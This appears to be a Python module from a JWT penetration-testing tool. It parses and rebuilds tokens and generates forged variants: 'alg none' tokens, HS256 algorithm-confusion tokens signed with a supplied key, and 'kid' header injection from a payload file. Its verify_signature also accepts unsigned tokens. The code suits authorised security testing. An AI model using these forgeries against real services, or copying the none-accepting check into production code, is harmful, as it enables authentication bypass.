import hashlib
import hmac
import json

import pem

import signatures
import requests

from jwt import utils
from cryptography.hazmat.primitives.serialization import (
    load_pem_private_key, load_pem_public_key
)
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric.rsa import (
    RSAPrivateKey, RSAPublicKey, RSAPrivateNumbers, RSAPublicNumbers,
    rsa_recover_prime_factors, rsa_crt_dmp1, rsa_crt_dmq1, rsa_crt_iqmp
)



class TestJWT:
    """
    Contains JWT under test and related key material
    """

    def __init__(self):
        self.is_json = True
        self.header = {}
        self.payload = {}

    def get_payload(self):
        if self.is_json:
            return self.payload
        return self.payload['default']

    def set_payload(self, payload):
        if TestJWT.is_dict(payload):
            self.payload = payload
        else:
            self.is_json = False
            self.payload = {"default": payload}

    @staticmethod
    def is_dict(text):
        if isinstance(text, dict):
            return True
        else:
            return False

    @staticmethod
    def split_jwt(ser_token):
        return ser_token.split(".", 3)

    @staticmethod
    def deserialize(ser_token):
        tok1, tok2, sig = TestJWT.split_jwt(ser_token)
        # print("header {}".format(tok1))
        # print("payload {}".format(tok2))
        # print("sig {}".format(sig))
        head = utils.base64url_decode(tok1)
        payload = utils.base64url_decode(tok2)
        jwt = TestJWT()
        jwt.original_jwt = ser_token;

        # noinspection PyBroadException
        try:
            jwt.header = json.loads(head)
            jwt_payload = json.loads(payload)
            jwt.set_payload(jwt_payload)
        except:
            jwt.set_payload(utils.force_unicode(payload))
        return jwt

    def show_token(self):
        print("\nIs JSON: {}".format(self.is_json))
        print("\nToken header:")
        print(json.dumps(self.header, indent=4, ensure_ascii=True))
        for i in self.header:
            "-> {} = {}".format(i, self.header[i])

        print("\nToken payload:")
        if self.is_json:
            print(json.dumps(self.get_payload(), indent=4, ensure_ascii=True))
            for i in self.get_payload():
                print("-> {} = {}".format(i, self.get_payload()[i]))
        else:
            print(self.get_payload())

    def get_algorithm(self):
        return self.header['alg']

    def set_algorithm(self, new_alg):
        self.header['alg'] = new_alg

    @staticmethod
    def build_section(dict_section):
        if TestJWT.is_dict(dict_section):
            new_section = utils.base64url_encode(utils.force_bytes(json.dumps(dict_section, separators=(",", ":"))))
        else:
            new_section = utils.base64url_encode(utils.force_bytes(dict_section))
        return new_section

    def build_token_without_signature(self):
        return TestJWT.build_section(self.header) + utils.force_bytes('.') + TestJWT.build_section(self.payload)

    def build_token(self, key=None):
        content_to_sign = self.build_token_without_signature()
        return content_to_sign + utils.force_bytes('.') + signatures.sign(self.get_algorithm(), content_to_sign,
                                                                          key=key)

    def verify_signature(self, key, expected_sig):
        alg = self.header['alg']
        print("Verify signature using alg {}".format(alg))
        if alg is None:
            print("Signature algorithm not set")
            return False
        if str.capitalize(alg) == "NONE":
            return True
        alg = self.get_algorithm()
        return signatures.verify(alg, self.build_token_without_signature(), key, utils.force_bytes(expected_sig))

    def compute_signature(self, key):
        alg = self.get_algorithm()
        print("Computing signature using alg {}".format(alg))
        if alg is None:
            print("Signature algorithm not set")
            return False
        if str.capitalize(alg) == "NONE":
            return self.build_token_without_signature()
        content_to_sign = utils.base64url_encode(
            utils.force_bytes(json.dumps(self.header, separators=(",", ":")))) + utils.force_bytes(
            ".") + utils.base64url_encode(utils.force_bytes(json.dumps(self.payload, separators=(",", ":"))))
        return signatures.sign(alg, content_to_sign, key=key)

    def attack_none(self):
        payloads = {}

        self.set_algorithm('none')
        payloads['attack_alg_none'] = utils.force_unicode(self.build_token())

        self.set_algorithm('None')
        payloads['attack_alg_None'] = utils.force_unicode(self.build_token())

        self.set_algorithm('NONE')
        payloads['attack_alg_NONE'] = utils.force_unicode(self.build_token())

        return payloads

    @staticmethod
    def read_file(file: str, strip_newline=True, join_lines=False):
        if file.lower().startswith("https://"):
            key_list = requests.get(file, verify=True).text.splitlines()
        else:
            with open(file, "r") as f:
                key_list = f.readlines()
        if strip_newline:
            key_list = [x.replace('\n', '').strip() for x in key_list]
        if join_lines:
            return "".join(key_list)
        return key_list

    @staticmethod
    def inject_in_json(header: dict, payload: str):
        key = header['kid']
        if key is not None:
            header['kid'] = payload
        return TestJWT.build_section(header)

    def attack_signature_deception(self, url):
        payloads = {}
        secret = TestJWT.read_file(url, strip_newline=False, join_lines=False)
        self.set_algorithm("HS256")
        payloads['attack_signature_deception'] = self.build_token(secret)
        return payloads

    @staticmethod
    def attack_payload(serial_jwt: str, payload_file: str):
        lines = TestJWT.read_file(payload_file, join_lines=False)
        header, payload, signature = serial_jwt.split(".")
        header = json.loads(utils.base64url_decode(header))
        payloads = [TestJWT.inject_in_json(header, line) for line in lines]
        attacks = {}
        for index, attack_payload in zip(range(1, payload.__len__()), payloads):
            attacks["attack_payload_{}".format(index)] = ".".join(
                [utils.force_unicode(attack_payload), payload, signature])
        return attacks

    @staticmethod
    def read_pem_file(file):
        key = pem.parse_file(file)
        print(str(key))
        return key[0].as_bytes()

    @staticmethod
    def rsa_pubkey_to_jwk(pem_file, key_id = None):
        '''
        Only RS256 supported so far
        :param pem_file: path of PEM file containing RSA public key
        :param key_id: (optional) keyid to be included in the JWK
        :return:
        '''
        rsa_pk: RSAPublicKey = load_pem_public_key(TestJWT.read_pem_file(pem_file), default_backend())
        e = rsa_pk.public_numbers().e
        n = rsa_pk.public_numbers().n
        jwk = {}
        if key_id is not None:
            jwk['kid'] = key_id
        jwk['kty'] = "RSA"
        jwk["alg"] = "RS256"
        jwk['n'] = utils.base64url_encode(n.to_bytes((n.bit_length() + 7) // 8, byteorder='big'))
        jwk['e'] = utils.base64url_encode(e.to_bytes((e.bit_length() + 7) // 8, byteorder='big'))
        return jwk

    @staticmethod
    def rsa_jwk_to_pubkey(jwk):
        '''
        Only RS256 supported so far
        :return:
        '''

        e = int.from_bytes(utils.base64url_decode(jwk['e']), byteorder='big')
        n = int.from_bytes(utils.base64url_decode(jwk['n']), byteorder='big')
        pub_num = RSAPublicNumbers(e, n)
        return pub_num.public_key(backend=default_backend())

